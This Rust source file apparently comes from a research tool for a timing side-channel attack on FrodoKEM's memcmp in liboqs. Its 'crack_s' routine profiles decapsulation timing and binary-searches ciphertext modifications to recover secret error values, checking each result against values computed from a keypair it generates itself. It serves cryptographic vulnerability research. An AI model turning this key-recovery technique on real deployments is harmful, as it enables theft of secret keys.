use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::profile::profile;
use crate::attack::memcmp_frodo::profile::Profile;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::save_to_csv;
use crate::utils::Rec;
use crate::utils::Recorder;
use liboqs_rs_bindings as oqs;
use log::{debug, error, info, trace, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::convert::TryInto;
use std::path::PathBuf;

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    index_ij: usize,
    iterations: u64,
    measure_source: &MeasureSource,
    profile: Profile,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
    expected_x0: u16,
    save_to_file: Option<&PathBuf>,
) -> Result<u16, String> {
    let maxmod = error_correction_limit::<FRODO>() * 2;
    let mut high = maxmod + 2; // This ensures that we try maxmod-1 first
    let mut low = maxmod - 3; // This ensures that we try maxmod-1 first
    let mut highmodtime = None;
    let mut threshold = None;
    let found = loop {
        let profile = profile.clone();
        let currentmod: u16 = ((high + low) / 2).try_into().map_err(|_| "overflow")?;
        trace!("high: {}, low: {}", high, low);
        debug!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            iterations
        );
        let rec = mod_measure::<FRODO, _>(
            currentmod,
            index_ij,
            iterations,
            &measure_source,
            ciphertext,
            shared_secret_d,
            secret_key,
            Recorder::saveall(
                format!("BINSEARCH[{}]({}){{{}}}", index_ij, expected_x0, currentmod),
                Some(profile.cutoff),
            ),
        )?;
        let time = rec.aggregated_value()?;
        if let Some(path) = save_to_file {
            let mut recorders = profile.recorders.borrow_mut();
            recorders.push(rec);
            debug!("Saving measurments to file {:?}", path);
            save_to_csv(&path, &recorders)?;
        }

        debug!("time measurment is {}", time);
        if let Some(threshold) = threshold {
            if time >= threshold {
                debug!(
                    "C[{}/{}] => +Raising lowerbound to {}",
                    index_ij,
                    FRODO::C::len() - 1,
                    currentmod
                );
                low = currentmod;
            } else {
                debug!(
                    "C[{}/{}] => -Lowering upperbound to {}",
                    index_ij,
                    FRODO::C::len() - 1,
                    currentmod
                );
                high = currentmod;
            }
        } else if let Some(threshold_low) = highmodtime {
            info!(
                "C[{}/{}] => Mean of low amount of modifications: {}",
                index_ij,
                FRODO::C::len() - 1,
                time
            );
            if time <= threshold_low {
                error!(
                    "threshold high ({}) <= threshold low ({})",
                    time, threshold_low
                );
                return Err(
                    "Could not make a good profile, try again with a higher iteration count!"
                        .to_string(),
                );
            }

            let diff = time - threshold_low;
            threshold.replace(threshold_low + (diff / 2));
            info!("New threshold is: {:?}", threshold);
            high = maxmod;
            low = 0;
        } else {
            info!(
                "C[{}/{}] => Mean of high amount of modifications: {}",
                index_ij,
                FRODO::C::len() - 1,
                time
            );
            highmodtime.replace(time);
            high = 2; // This ensures we try 1 as the second trial
            low = 0; // This ensures we try 1 as the second trial
        }
        if high - low == 1 {
            break low;
        }
    };
    if high == maxmod {
        warn!("Upper bound never changed, we might have missed the real threshold modification!");
    }
    if low == 0 {
        warn!("Lower bound never changed, we might have missed the real threshold modification!");
    }

    Ok(found as u16)
}

#[logfn_inputs(Trace)]
pub fn crack_s<FRODO: FrodoKem>(
    warmup: u64,
    iterations: u64,
    profileiters: u64,
    measure_source: MeasureSource,
    save_to_file: Option<PathBuf>,
) -> Result<(), String> {
    #![allow(non_snake_case)]
    info!(
        "Launching the crack_s routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();

    //let n = FRODO::params().PARAM_N;
    let nbar: usize = FRODO::params().PARAM_NBAR;
    let mbar = nbar;
    let err_corr_limit = error_correction_limit::<FRODO>();
    let nbr_encaps = 1;
    let i = mbar - 1;

    for t in 0..nbr_encaps {
        info!("Using encaps to generate ciphertext number: {}", t);
        FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
        let expectedEppp = FRODO::calculate_Eppp(&mut ciphertext, &mut secret_key)?;
        let expectedEppp = expectedEppp.as_slice();

        for j in 0..nbar {
            // Modify ciphertext at C[nbar-1, j]
            let index = i * nbar + j;

            let profile = profile::<FRODO>(
                index,
                warmup,
                profileiters,
                measure_source,
                &mut secret_key,
                &mut ciphertext,
                save_to_file.as_ref(),
            )?;

            let expected_x0 = (err_corr_limit - expectedEppp[index]) as u16;

            info!(
                "Starting binary search for Eppp[{},{}], expect to find x0 = {}",
                i, j, expected_x0
            );
            let x0 = search_modification::<FRODO>(
                index,
                iterations,
                &measure_source,
                profile.clone(),
                &mut ciphertext,
                &mut shared_secret_d,
                &mut secret_key,
                expected_x0,
                save_to_file.as_ref(),
            )?;

            let Eppp_ij = err_corr_limit - x0;
            if Eppp_ij - 1 != expectedEppp[index] {
                warn!(
                    "Found -Eppp[{},{}]={} expected: {}",
                    i, j, Eppp_ij, expectedEppp[index]
                )
            } else {
                info!(
                    "Found -Eppp[{},{}]={} expected: {}",
                    i, j, Eppp_ij, expectedEppp[index]
                );
            }
        }
    }

    Ok(())
}
